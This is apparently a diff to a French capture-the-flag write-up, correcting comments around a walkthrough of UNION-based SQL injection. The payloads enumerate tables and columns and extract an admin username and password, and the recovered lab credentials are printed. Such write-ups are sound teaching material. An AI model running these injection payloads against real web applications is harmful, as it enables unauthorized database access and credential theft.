@@ -41,7 +41,7 @@ En inspectant le code de la page, on voit que l'on a récupéré un cookie uuid,
 
 <p align="center"><img src="SQL Injections.png" alt="SQL Injections" width="500"></p>
 
-Pour obtenir plus d'information, on va entrer les injections SQL suivantes : 
+Pour obtenir plus d'information, on va réaliser les injections SQL suivantes : 
 
 ```
 # On cherche le nombre de champs récupère par la requête, on fini par trouver le nombre de 3 champs
@@ -50,18 +50,17 @@ Pour obtenir plus d'information, on va entrer les injections SQL suivantes :
 # On cherche les différentes tables présentent dans la base de données.
 ' UNION SELECT group_concat(table_name), null, null FROM information_schema.tables -- a 
 
-# On cherche les différentes tables présentent dans la base de données.
+# On cherche les différentes collones présentent dans table 'users'.
 ' UNION SELECT group_concat(column_name), null, null FROM information_schema.columns WHERE table_name='users' -- a 
 
-# On cherche les différents statut qui existe pour les utilisateurs.
+# On cherche les différents statut qui existe dans table 'users'.
 ' UNION SELECT group_concat(status), null, null FROM users -- a 
 
 # On cherche les utilisateurs dans la table 'users' qui ont un statut admin.
 ' UNION SELECT group_concat(username), null, null FROM users WHERE status = 'admin' -- a
 
-# On récupère le mot de passe d'un des utilisateur qui ont le statut admin.
+# On récupère le mot de passe d'un des utilisateurs qui a le statut admin.
 ' UNION SELECT group_concat(password), null, null FROM users WHERE username = 'madeleineforestier' -- a
-
 ```
 
 On dispose désormais du nom d'utilisateur et du mot de passe d'un compte administrateur (username = madeleineforestier / password = fo2DVkgShz2pPJ). On se connecte avec ces informations, ce qui nous amène au profil de l'administrateur où un lien vers le panneau d'administration est disponible. On clique dessus et on découvre alors le drapeau.
